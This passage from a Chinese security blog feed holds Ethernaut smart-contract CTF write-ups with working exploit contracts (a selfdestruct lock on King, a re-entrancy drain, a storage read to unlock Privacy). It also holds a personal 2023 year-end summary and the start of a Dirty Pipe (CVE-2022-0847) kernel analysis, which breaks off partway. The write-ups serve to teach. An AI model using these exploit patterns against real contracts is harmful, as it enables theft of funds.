+<p>联系到前面<code>Force</code>这题，我们知道一个合约可以调用<code>selfdestruct</code>来自毁，那如果我们自毁了，自然就没法正常收到他的transfer，这样一来他的执行就会在更改king之前报错并退出evm执行（如果合约使用的是<code>payable(king).call{value:msg.value}(&quot;&quot;)</code>这样的方式来转账的话，也许就没办法断下来了）。</p>
+<p>所以整理一下思路就是：</p>
+<ol>
+<li>部署一个中间合约，并在其<code>receive</code>中埋入自毁的代码</li>
+<li>通过中间合约向题目合约转账使其成为新的国王</li>
+<li>向中间合约转账使其触发<code>receive</code>中的自毁</li>
+<li>提交题目，题目无法完成转账，从而无法运行到国王转让的机器码</li>
+</ol>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+
+  address king;
+  uint public prize;
+  address public owner;
+
+  constructor() payable {
+    owner = msg.sender;  
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  receive() external payable {
+    require(msg.value &gt;= prize || msg.sender == owner);
+    payable(king).transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function _king() public view returns (address) {
+    return king;
+  }
+}
+
+contract exp {
+    King public interfaceKing;
+    constructor(address payable _addr) payable {
+        interfaceKing = King(_addr);
+    }
+    function claim() public {
+        (bool success,) = payable(address(interfaceKing)).call{value: 0.001 ether}(&quot;&quot;);
+        require(success, &quot;claim failed&quot;);
+    }
+    receive() external payable {
+        selfdestruct(payable(address(0x7Af5626f15AAa698FF6bb04f48a28fd954961d2E)));
+    }
+}
+</code></pre>
+<h1 id="re-entrancy">Re-entrancy</h1>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import 'openzeppelin-contracts-06/math/SafeMath.sol';
+
+contract Reentrance {
+  
+  using SafeMath for uint256;
+  mapping(address =&gt; uint) public balances;
+
+  function donate(address _to) public payable {
+    balances[_to] = balances[_to].add(msg.value);
+  }
+
+  function balanceOf(address _who) public view returns (uint balance) {
+    return balances[_who];
+  }
+
+  function withdraw(uint _amount) public {
+    if(balances[msg.sender] &gt;= _amount) {
+      (bool result,) = msg.sender.call{value:_amount}(&quot;&quot;);
+      if(result) {
+        _amount;
+      }
+      balances[msg.sender] -= _amount;
+    }
+  }
+
+  receive() external payable {}
+}
+</code></pre>
+<p>关卡目标是偷走合约账户内的所有余额。</p>
+<p>题目合约实现了一个简单的存取款系统，该合约使用<code>SafeMath</code>库介入<code>uint256</code>的运算（<code>uint</code>一般情况下等价于<code>uint256</code>），也就是说balances不存在整数溢出。</p>
+<p>既然题目取名为<code>re-entrancy</code>，必然会联想到blockchain中的一个经典利用——重入攻击。</p>
+<p>所谓重入攻击，ChatGPT的描述是：</p>
+<pre><code>重入攻击是一种在以太坊智能合约中可能发生的安全威胁，它利用合约中的递归调用机制。攻击者试图在合约的外部调用中反复执行合约函数，从而可能导致未经授权的资金转移或执行不当的操作。
+
+重入攻击的主要原理是，在一个函数调用未完成之前，攻击者通过递归调用将同一个函数再次触发执行。当函数被重新调用时，合约状态可能尚未更新，导致攻击者能够在未受限制的情况下执行某些操作。
+</code></pre>
+<p>有了这个提示，再来分析<code>withdraw</code>函数取款的逻辑：</p>
+<ol>
+<li>判断对方账户的balance是否大于等于想要取走的数量<code>_amount</code></li>
+<li>使用<code>msg.sender.call{value:_amount}(&quot;&quot;)</code>发起转账</li>
+<li>扣掉对应账户的balance</li>
+</ol>
+<p>这里存在的问题就是，先进行了转账操作，再去维护对应的balances映射，且使用call(&quot;&quot;)转账会命中到对应合约的fallback函数上，如果我们此时再去递归调用它的withdraw函数申请取款，此时未经维护的balance仍然满足取款条件，即可成功转走多的余额。</p>
+<p>（题目源码的safemath库在remix ide上访问不到，所以自己去github找了一个）</p>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol&quot;;
+
+contract Reentrance {
+  
+  using SafeMath for uint256;
+  mapping(address =&gt; uint) public balances;
+
+  function donate(address _to) public payable {
+    balances[_to] = balances[_to].add(msg.value);
+  }
+
+  function balanceOf(address _who) public view returns (uint balance) {
+    return balances[_who];
+  }
+
+  function withdraw(uint _amount) public {
+    if(balances[msg.sender] &gt;= _amount) {
+      (bool result,) = msg.sender.call{value:_amount}(&quot;&quot;);
+      if(result) {
+        _amount;
+      }
+      balances[msg.sender] -= _amount;
+    }
+  }
+
+  receive() external payable {}
+}
+
+contract exp {
+    Reentrance public interfaceReentrance;
+    constructor(address payable _addr) public payable {
+        interfaceReentrance = Reentrance(_addr);
+    }
+
+    function pwn() public {
+        interfaceReentrance.donate{value: 0.001 ether}(address(this));
+        interfaceReentrance.withdraw(0.001 ether);
+    }
+
+    receive() external payable {
+        interfaceReentrance.withdraw(msg.value);
+    }
+
+}
+</code></pre>
+<h1 id="elevator">Elevator</h1>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+  function isLastFloor(uint) external returns (bool);
+}
+
+
+contract Elevator {
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+}
+</code></pre>
+<p>题目的目标是&quot;通过电梯走到顶层&quot;，即令合约的state变量<code>top</code>为<code>true</code>。</p>
+<p><code>goTo</code>函数中判断top的逻辑看似矛盾，但这个接口是我们自己来定义的，所以直接实现一个相邻两次返回不同结果的<code>isLastFloor</code>函数即可成功修改掉<code>top</code>。</p>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+  function isLastFloor(uint) external returns (bool);
+}
+
+
+contract Elevator {
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+}
+
+contract exp {
+    uint public cnt = 0;
+    Elevator public interfaceElevator;
+
+    constructor(address _addr) {
+        interfaceElevator = Elevator(_addr);
+    }
+
+    function isLastFloor(uint) public returns (bool) {
+        cnt++;
+        if (cnt % 2 != 0) {
+            return false;
+        }
+        else {
+            return true;
+        }
+    }
+
+    function pwn() public {
+        interfaceElevator.goTo(114514);
+    }
+}
+</code></pre>
+<h1 id="privacy">Privacy</h1>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Privacy {
+
+  bool public locked = true;
+  uint256 public ID = block.timestamp;
+  uint8 private flattening = 10;
+  uint8 private denomination = 255;
+  uint16 private awkwardness = uint16(block.timestamp);
+  bytes32[3] private data;
+
+  constructor(bytes32[3] memory _data) {
+    data = _data;
+  }
+  
+  function unlock(bytes16 _key) public {
+    require(_key == bytes16(data[2]));
+    locked = false;
+  }
+
+  /*
+    A bunch of super advanced solidity algorithms...
+
+      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
+      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
+      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
+      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
+      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
+  */
+}
+</code></pre>
+<p>类似于前面的<code>Vault</code>，这道题的目标也是使<code>locked</code>为<code>true</code>。</p>
+<p>编译后查看STORAGELAYOUT</p>
+<pre><code class="language-json">{
+    &quot;storage&quot;: [
+        {
+            &quot;astId&quot;: 4,
+            &quot;contract&quot;: &quot;koin.sol:Privacy&quot;,
+            &quot;label&quot;: &quot;locked&quot;,
+            &quot;offset&quot;: 0,
+            &quot;slot&quot;: &quot;0&quot;,
+            &quot;type&quot;: &quot;t_bool&quot;
+        },
+        {
+            &quot;astId&quot;: 8,
+            &quot;contract&quot;: &quot;koin.sol:Privacy&quot;,
+            &quot;label&quot;: &quot;ID&quot;,
+            &quot;offset&quot;: 0,
+            &quot;slot&quot;: &quot;1&quot;,
+            &quot;type&quot;: &quot;t_uint256&quot;
+        },
+        {
+            &quot;astId&quot;: 11,
+            &quot;contract&quot;: &quot;koin.sol:Privacy&quot;,
+            &quot;label&quot;: &quot;flattening&quot;,
+            &quot;offset&quot;: 0,
+            &quot;slot&quot;: &quot;2&quot;,
+            &quot;type&quot;: &quot;t_uint8&quot;
+        },
+        {
+            &quot;astId&quot;: 14,
+            &quot;contract&quot;: &quot;koin.sol:Privacy&quot;,
+            &quot;label&quot;: &quot;denomination&quot;,
+            &quot;offset&quot;: 1,
+            &quot;slot&quot;: &quot;2&quot;,
+            &quot;type&quot;: &quot;t_uint8&quot;
+        },
+        {
+            &quot;astId&quot;: 21,
+            &quot;contract&quot;: &quot;koin.sol:Privacy&quot;,
+            &quot;label&quot;: &quot;awkwardness&quot;,
+            &quot;offset&quot;: 2,
+            &quot;slot&quot;: &quot;2&quot;,
+            &quot;type&quot;: &quot;t_uint16&quot;
+        },
+        {
+            &quot;astId&quot;: 25,
+            &quot;contract&quot;: &quot;koin.sol:Privacy&quot;,
+            &quot;label&quot;: &quot;data&quot;,
+            &quot;offset&quot;: 0,
+            &quot;slot&quot;: &quot;3&quot;,
+            &quot;type&quot;: &quot;t_array(t_bytes32)3_storage&quot;
+        }
+    ],
+    &quot;types&quot;: {
+        &quot;t_array(t_bytes32)3_storage&quot;: {
+            &quot;base&quot;: &quot;t_bytes32&quot;,
+            &quot;encoding&quot;: &quot;inplace&quot;,
+            &quot;label&quot;: &quot;bytes32[3]&quot;,
+            &quot;numberOfBytes&quot;: &quot;96&quot;
+        },
+        &quot;t_bool&quot;: {
+            &quot;encoding&quot;: &quot;inplace&quot;,
+            &quot;label&quot;: &quot;bool&quot;,
+            &quot;numberOfBytes&quot;: &quot;1&quot;
+        },
+        &quot;t_bytes32&quot;: {
+            &quot;encoding&quot;: &quot;inplace&quot;,
+            &quot;label&quot;: &quot;bytes32&quot;,
+            &quot;numberOfBytes&quot;: &quot;32&quot;
+        },
+        &quot;t_uint16&quot;: {
+            &quot;encoding&quot;: &quot;inplace&quot;,
+            &quot;label&quot;: &quot;uint16&quot;,
+            &quot;numberOfBytes&quot;: &quot;2&quot;
+        },
+        &quot;t_uint256&quot;: {
+            &quot;encoding&quot;: &quot;inplace&quot;,
+            &quot;label&quot;: &quot;uint256&quot;,
+            &quot;numberOfBytes&quot;: &quot;32&quot;
+        },
+        &quot;t_uint8&quot;: {
+            &quot;encoding&quot;: &quot;inplace&quot;,
+            &quot;label&quot;: &quot;uint8&quot;,
+            &quot;numberOfBytes&quot;: &quot;1&quot;
+        }
+    }
+}
+</code></pre>
+<p>可以看到<code>data</code>起始位置处于第三个slot，而一个bytes32类型的状态变量会占用一整个slot，<code>unlock</code>中用到的<code>data[2]</code>就在第5个slot中。</p>
+<p>在web console中用<code>web3.eth.getStorageAt(instance, 5)</code>得到结果<code>0xc55a9e32a3927345e2c6567b2fb8d57e376c2e1188bbff5b0d4f660cb2d66609</code>。</p>
+<p>题目在对比之前还进行了显示强转，将其转化为了<code>bytes16</code>，也就是截断后面的16个字节。这里笔者偷懒直接在攻击合约中让他自己强转了（不缺gas费（暴论））。</p>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IPrivacy {
+  function unlock(bytes16) external;
+}
+
+contract exp {
+  address public instance;
+  bytes32 public raw;
+  bytes16 public key;
+  constructor(address _addr, bytes32 _raw) {
+    instance = _addr;
+    raw = _raw;
+    key = bytes16(raw);
+  }
+
+  function pwn() public {
+    IPrivacy(instance).unlock(key);
+  }
+
+}
+</code></pre>
+<h1 id="gatekeeperone">GatekeeperOne</h1>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperOne {
+
+  address public entrant;
+
+  modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+  }
+
+  modifier gateTwo() {
+    require(gasleft() % 8191 == 0);
+    _;
+  }
+
+  modifier gateThree(bytes8 _gateKey) {
+      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);
+      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);
+      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);
+    _;
+  }
+
+  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    entrant = tx.origin;
+    return true;
+  }
+}
+</code></pre>
+<p>题目目标是使enter返回<code>true</code>，且成功将<code>entrant</code>注册为我们的账户。</p>
+<p>enter函数有3个条件检查的修饰，分别对应了三个检查：</p>
+<p>第一个比较简单，只要使用中间合约来与目标合约交互即可绕过。</p>
+<p>第二个是检查了运行到</p>
+<p>（待更新。。。）</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[2023年终总结]]></title>
+        <id>https://kotoriseed.github.io/post/2023YearEndSummary/</id>
+        <link href="https://kotoriseed.github.io/post/2023YearEndSummary/">
+        </link>
+        <updated>2023-12-22T16:54:09.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>卷尽残花风未定，休恨，花开元自要春风。</p>
+</blockquote>
+<h1 id="年终总结">年终总结</h1>
+<p>今年发生的事情其实特别多，心境的变化更是一言难尽。最近比较疲惫，就简单的说一说吧。</p>
+<h2 id="学习工作">学习&amp;工作</h2>
+<p>恍惚间发现自己已经步入了大学的最后一年，而技术却仍一言难尽，面对接下来的秋招只有惶恐和不安。由于一些原因，在5月接触到了一个难得的工作机会（其实是有两个，其中一个被我放掉了），但内容和我研究了快两年的二进制漏洞完全不同。经过了一段时间的犹豫，我最终还是在7月初选择了入职，鼠鼠我就这样潦草地踏上了社畜的道路。</p>
+<p>这次工作并没有像我预想的那样展开，而且上来就给了我当头一棒。工作环境略微压抑，以及是我不那么感兴趣的研究方向（安全开发），让我仅仅在前7天就有了三五次放弃的念头。秉承着自己选的路跪着也要走下去这条原则，还是慢慢接纳了下来，甚至还渐渐开始觉得这方面的研究其实挺有意思的，虽然和漏洞没多大关系，但也能让我从另一个层面感受到二进制的奇妙，想着如果一直这样下去也挺好的。到10月为止，我做出了挺多不错的产出，也获得了前辈的认可。也许是欠缺了一些缘分吧，我最终还是在10月中旬离开了这个待了3个月的地方。</p>
+<p>因为上一段工作的原因，我彻底错过了秋招，这对我的影响其实是相当大的，许多也许本来能抓住的机会也丢了。无奈，但活路还是要接着干起走的，简短地gap了一个月之后，于11月中旬开始了我的第二段工作。</p>
+<p>第二次工作的内容就是正儿八经的二进制漏洞了，到年底的这段时间里静下心来做了不少的提升，从redis到chrome，大大小小的项目都有了一定的研究和成果，也赶在自己的生日前拿到了人生中的第一个CVE。比较有意思的是，该CVE是我利用多线程下的堆风水完成的，与去年在VNCTF出的一道题有一定的相似之处，等厂商修复之后可以出一篇博客来记录一下这次挖洞的心路历程。总的来看，其实相比去年是有了不小的进步的，但想找到满意的工作还是远远不够。开始上班过后，下班时间就很少拿来做技术提升了，博客也因此停更了整整半年，确实是犯下了怠惰之罪，后面一定要及时调整过来。</p>
+<p>在这一年里，大大小小的比赛参加了不少，比较值得一提的就是几次线下赛。印象最深的还是在杭州的网鼎杯，ak了半决赛的pwn题，还有由于恐机而不得不来回都坐了长达13小时的高铁，也正是这一次高铁往返让我明白了恐机只是相对的（所以后面铁三决赛去福州果断选择了飞机）。</p>
+<p>作为CTFer的日子可能就此结束了，是时候和生活对线了。以后也许还是会和战队一起打比赛，但在此之前还是先把满意的工作找到最重要。虽然最近非常破防，偶尔甚至打心底觉得自己在往一个没有未来的方向做无意义的奋斗，但我知道这些都是看到了一些不那么公平的事情过后正常的反应，回过头静下心来还是要好好为提升自己努力。春招可能是最后的机会了，希望能把握住吧。</p>
+<h2 id="生活">生活</h2>
+<p>新冠疫情解封的一年，终于是在大学的尾巴体验了一把大学生该有的生活。打比赛没有线下的遗憾算是弥补了，零零散散的去了很多没去过的城市，也算是感受到了许多不同的人文氛围。11月份也因为工作的变动，和很要好的朋友住到了对门，简直不要太爽。不过新工作的作息时间确实不太友好，感觉整个人的身子越来越虚了，还是需要好好运动和调整。</p>
+<p>其他的就不多说了，贴图：</p>
+<p>年初在重庆和几个队友面基了</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/12/23/8dc1cf76f9411.png" alt="1703262113272.png" loading="lazy"></figure>
+<p>手机上打西湖论剑</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/12/23/8488432e4ead1.png" alt="1703262056686.png" loading="lazy"></figure>
+<p>保留节目</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/12/23/3065d4710fac3.png" alt="1703262194317.png" loading="lazy"></figure>
+<p><del>网络安全奥运会</del></p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/12/23/315ade4c0a632.png" alt="1703261365488.png" loading="lazy"></figure>
+<p>西湖边的松鼠</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/12/23/9d73115c42c5e.png" alt="1703261250236.png" loading="lazy"></figure>
+<p>pwn手的吃饭睡觉摸鱼三项赛</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/12/23/cd34109efba7c.png" alt="1703261478808.png" loading="lazy"></figure>
+<p>福州海边捡的贝壳</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/12/23/06908709694f4.png" alt="1703261575031.png" loading="lazy"></figure>
+<p>在天津与南梦👴共进晚餐</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/12/23/77f88480895fa.png" alt="1703261680991.png" loading="lazy"></figure>
+<p>2v2公平竞技游戏说是</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/12/23/82ff0761620bb.png" alt="1703261786964.png" loading="lazy"></figure>
+<p>今年最喜欢的一只猫</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/12/23/689b01d561b50.png" alt="1703262259834.png" loading="lazy"></figure>
+<p>给对象织的🌻（比去年的满意一点）</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/12/23/07b32d752a4e1.png" alt="1703262488925.png" loading="lazy"></figure>
+<p>耻辱下机</p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/12/23/98b50eab9f598.png" alt="1703262569192.png" loading="lazy"></figure>
+<p>( )( ), ( )( )!</p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/12/23/3fbbcf1cfd5b3.png" alt="1703262597588.png" loading="lazy"></figure>
+<p>少爷的游轮生日派对震撼我一年</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/12/23/cad385071336e.png" alt="1703262625043.png" loading="lazy"></figure>
+<h1 id="对2024的希望">对2024的希望</h1>
+<p>回顾去年对今年的希望，固件漏洞仍然没有开始，而且转向了纯软件的领域，毕设的课题也因为方向的转换与预期产生了偏差，但总体来说还是可以接受的。身体方面还算健康，相比去年也减了20斤，运动还是挺欠缺的，继续加油吧。和大家的关系处的都不错，以后也继续好下去！</p>
+<p>明年的自己，希望你能回来看看这些目标实现的怎么样了：</p>
+<ul>
+<li>找到让自己满意的工作并拥有一个像样的住处开始你的生活</li>
+<li>继续研究二进制安全，挖到影响力更大的漏洞</li>
+<li>身体健康，多多运动</li>
+<li>多读书，少玩游戏</li>
+<li>和我在意的大家一起继续好好相处！</li>
+</ul>
+<p>最后，感谢看到这里的各位，感谢对我投以无微不至的关心的女朋友和家人，感谢这一年里帮助我，鼓励我的好朋友们，新的一年里互励共勉！</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2022-0847 Dirty Pipe]]></title>
+        <id>https://kotoriseed.github.io/post/cve-2022-0847/</id>
+        <link href="https://kotoriseed.github.io/post/cve-2022-0847/">
+        </link>
+        <updated>2023-05-25T12:23:26.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="漏洞简介">漏洞简介</h1>
+<h2 id="description">Description</h2>
+<p>A flaw was found in the way the &quot;flags&quot; member of the new pipe buffer structure was lacking proper initialization in<code> copy_page_to_iter_pipe</code> and push_pipe functions in the Linux kernel and could thus contain stale values. An unprivileged local user could use this flaw to write to pages in the page cache backed by read only files and as such escalate their privileges on the system.</p>
+<p>简单的来说就是由于没有对<code>pipe_buffer-&gt;flags</code>字段进行初始化，最后导致了越权写入。类似于&quot;dirty cow&quot;漏洞，但该漏洞的利用条件更为简单。</p>
+<pre><code>漏洞编号: CVE-2022-0847
+适用版本: 该漏洞影响从5.8开始的大部分主流版本，直到5.16.11, 5.15.25, 5.10.102才被修复。
+漏洞评分: CVSS Version 3.x: 7.8(HIGH)
+		CVSS Version 2.0: 7.2(HIGH)
+漏洞危害: 本地提权，对任意文件（至少具有读权限）写入不超过一张内存页的数据。
+</code></pre>
+<h2 id="patch">Patch</h2>
+<p>参考<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903">这个commit</a></p>
+<pre><code class="language-bash">diff --git a/lib/iov_iter.c b/lib/iov_iter.c
+index b0e0acdf96c15..6dd5330f7a995 100644
+--- a/lib/iov_iter.c
++++ b/lib/iov_iter.c
+@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
+ 		return 0;
+ 
+ 	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;
++	buf-&gt;flags = 0;
+ 	get_page(page);
+ 	buf-&gt;page = page;
+ 	buf-&gt;offset = offset;
+@@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size,
+ 			break;
+ 
+ 		buf-&gt;ops = &amp;default_pipe_buf_ops;
++		buf-&gt;flags = 0;
+ 		buf-&gt;page = page;
+ 		buf-&gt;offset = 0;
+ 		buf-&gt;len = min_t(ssize_t, left, PAGE_SIZE);
+</code></pre>
+<h1 id="漏洞分析">漏洞分析</h1>
+<p>笔者复现时使用的内核是<code>linux-5.16.10</code>，文件系统是<code>busybox-1.3.2</code>编译的。以下操作和源码皆基于此版本。</p>
+<h2 id="pipe相关">pipe相关</h2>
+<p>管道是IPC的一个重要实现手段，其本体是一个<code>pipe_inode_info</code>结构体，</p>
+<pre><code class="language-c">struct pipe_inode_info {
+	struct mutex mutex; // 全局互斥体
+	wait_queue_head_t rd_wait; // 空管道中reader的等待点
+    wait_queue_head_t wr_wait; // 满管道中writer的等待点
+	unsigned int head; // 缓冲区生产点(The point of buffer production)
+	unsigned int tail; // 缓冲区消费点(The point of buffer consumption)
+	unsigned int max_usage; // 环上可使用的slot的最大数量
+	unsigned int ring_size; // 缓冲区的总数(必须是2的次方)
+#ifdef CONFIG_WATCH_QUEUE
+	bool note_loss; // The next read() should insert a data-lost message
+#endif
+	unsigned int nr_accounted; // 此管道在user-&gt;pipe_bufs中占的数量
+	unsigned int readers; // 当前管道reader的数量
+	unsigned int writers; // 当前管道writer的数量
+	unsigned int files; // 该管道被struct file引用的数量(protected by -&gt;i_lock)
+	unsigned int r_counter; // reader计数器
+	unsigned int w_counter; // writer计数器
+	unsigned int poll_usage; // is this pipe used for epoll, which has crazy wakeups?
+	struct page *tmp_page; // cached released page
+	struct fasync_struct *fasync_readers; // 读端fasync
+	struct fasync_struct *fasync_writers; // 写端fasync
+	struct pipe_buffer *bufs; // pipe_buffer的循环队列
+	struct user_struct *user; // 创建该管道的用户
+#ifdef CONFIG_WATCH_QUEUE
+	struct watch_queue *watch_queue; // stuff for watch_queue
+#endif
+};
+</code></pre>
+<p>通过对该结构维护的缓冲区进行读写即可完成进程间的读写通信。</p>
+<p><code>pipe_buffer</code>的结构如下：</p>
+<pre><code class="language-c">struct pipe_buffer {
+	struct page *page; // 缓冲区所在的内存页
+	unsigned int offset, len; // 缓冲区在对应内存页中的偏移和长度
+	const struct pipe_buf_operations *ops; //pipe_buffer结构的vtable(pipe_buf_operations)
+	unsigned int flags; // 标志位
+	unsigned long private; // private data owned by the ops
+};
+</code></pre>
+<p>在使用<code>pipe()</code>创建管道时，<code>pipe_buffer</code>的ops被赋值为<code>pipefifo_fops</code>，</p>
+<pre><code class="language-c">const struct file_operations pipefifo_fops = {
+	.open		= fifo_open,
+	.llseek		= no_llseek,
+	.read_iter	= pipe_read,
+	.write_iter	= pipe_write,
+	.poll		= pipe_poll,
+	.unlocked_ioctl	= pipe_ioctl,
+	.release	= pipe_release,
+	.fasync		= pipe_fasync,
+	.splice_write	= iter_file_splice_write,
+};
+</code></pre>
+<h3 id="pipe_write">pipe_write</h3>
+<p>将数据写入bufs中，在管道非空时，会尝试将新内容合并到队列的最后一个buffer中（需要目标buffer设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志位）。若该buffer写满之后还有剩余数据，则将新buffer入队，然后继续写入（此时可能会开辟新的物理页，且新buffer若未指定<code>O_DIRECT</code>选项就会标记上<code>PIPE_BUF_FLAG_CAN_MERGE</code>）。若管道满了，会做一些等待，被重新唤醒之后检查是否符合条件并尝试继续写入数据。</p>
+<h3 id="pipe_read">pipe_read</h3>
+<p>从bufs中读出数据，若管道已满，只有在开始读取后才会唤醒writer进行写入（使用<code>WF_SYNC</code>同步唤醒）。逐buffer读出数据，如果读完了则让对应buffer出队。</p>
+<h2 id="splice调用">splice调用</h2>
+<p>原型:</p>
+<pre><code class="language-c">ssize_t splice(int fd_in, loff_t *off_in, int fd_out,
+               loff_t *off_out, size_t len, unsigned int flags);
+/* @fd_in: 目标文件
+ * @off_in: 从指定的文件偏移处开始读取
+ * @fd_out: 指代一个pipe
+ * @len: 要传输的数据长度
+ * @flags: 标志位
+ */
+</code></pre>
+<p>该系统调用将pipe的缓存页用作文件之间数据的缓存页，实现跨文件的数据拷贝，避免了频繁的内核和用户间数据拷贝。</p>
+<p>有以下调用链：<code>splice</code> -&gt; <code>__do_splice</code> -&gt; <code>do_splice</code></p>
+<pre><code class="language-c">long do_splice(struct file *in, loff_t *off_in, struct file *out,
+	       loff_t *off_out, size_t len, unsigned int flags)
+{
+	struct pipe_inode_info *ipipe;
+	struct pipe_inode_info *opipe;
+	loff_t offset;
+	long ret;
+
+	if (unlikely(!(in-&gt;f_mode &amp; FMODE_READ) ||
+		     !(out-&gt;f_mode &amp; FMODE_WRITE)))
+		return -EBADF;
+
+	ipipe = get_pipe_info(in, true);
+	opipe = get_pipe_info(out, true);
+
+	if (ipipe &amp;&amp; opipe) {
+		if (off_in || off_out)
+			return -ESPIPE;
+
+		/* Splicing to self would be fun, but... */
+		if (ipipe == opipe)
+			return -EINVAL;
+
+		if ((in-&gt;f_flags | out-&gt;f_flags) &amp; O_NONBLOCK)
+			flags |= SPLICE_F_NONBLOCK;
+
+		return splice_pipe_to_pipe(ipipe, opipe, len, flags);
+	}
+
+	if (ipipe) {
+		if (off_in)
+			return -ESPIPE;
+		if (off_out) {
+			if (!(out-&gt;f_mode &amp; FMODE_PWRITE))
+				return -EINVAL;
+			offset = *off_out;
+		} else {
+			offset = out-&gt;f_pos;
+		}
+
+		if (unlikely(out-&gt;f_flags &amp; O_APPEND))
+			return -EINVAL;
+
+		ret = rw_verify_area(WRITE, out, &amp;offset, len);
+		if (unlikely(ret &lt; 0))
+			return ret;
+
+		if (in-&gt;f_flags &amp; O_NONBLOCK)
+			flags |= SPLICE_F_NONBLOCK;
+
+		file_start_write(out);
+		ret = do_splice_from(ipipe, out, &amp;offset, len, flags);
+		file_end_write(out);
+
+		if (!off_out)
+			out-&gt;f_pos = offset;
+		else
+			*off_out = offset;
+
+		return ret;
+	}
+
+	if (opipe) {
+		if (off_out)
+			return -ESPIPE;
+		if (off_in) {
+			if (!(in-&gt;f_mode &amp; FMODE_PREAD))
+				return -EINVAL;
+			offset = *off_in;
+		} else {
+			offset = in-&gt;f_pos;
+		}
+
+		if (out-&gt;f_flags &amp; O_NONBLOCK)
+			flags |= SPLICE_F_NONBLOCK;
+
+		ret = splice_file_to_pipe(in, opipe, &amp;offset, len, flags);
+		if (!off_in)
+			in-&gt;f_pos = offset;
+		else
+			*off_in = offset;
+
+		return ret;
+	}
+
+	return -EINVAL;
+}
+</code></pre>
+<p>可以看出，该函数对几种不同需求进行了分发处理，</p>
+<p>ipipe到opipe: <code>splice_pipe_to_pipe</code></p>
+<p>ipipe到文件: <code>do_splice_from</code></p>
+<p>文件到opipe: <code>spice_file_to_pipe</code></p>
+<h3 id="spice_file_to_pipe">spice_file_to_pipe</h3>
+<pre><code class="language-c">long splice_file_to_pipe(struct file *in,
+			 struct pipe_inode_info *opipe,
+			 loff_t *offset,
+			 size_t len, unsigned int flags)
+{
+	long ret;
+
+	pipe_lock(opipe);
